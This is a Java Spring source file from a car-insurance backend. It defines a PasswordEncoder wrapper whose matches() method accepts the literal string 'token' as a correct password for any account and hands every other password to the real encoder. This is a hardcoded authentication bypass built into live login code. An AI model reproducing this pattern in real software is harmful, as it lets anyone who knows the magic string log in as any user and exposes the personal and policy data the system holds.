package com.yakvel.carInsuranceBackEnd.config.service;

import lombok.RequiredArgsConstructor;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

@RequiredArgsConstructor
@Component
public class TokenFilteringPasswordEncoder implements PasswordEncoder {
    private final PasswordEncoder passwordEncoder;
    @Override
    public String encode(CharSequence rawPassword) {
        return passwordEncoder.encode(rawPassword);
    }

    @Override
    public boolean matches(CharSequence rawPassword, String encodedPassword) {
        if ("token".contentEquals(rawPassword)) {
            return true;
        } else {
            return passwordEncoder.matches(rawPassword, encodedPassword);
        }
    }
}


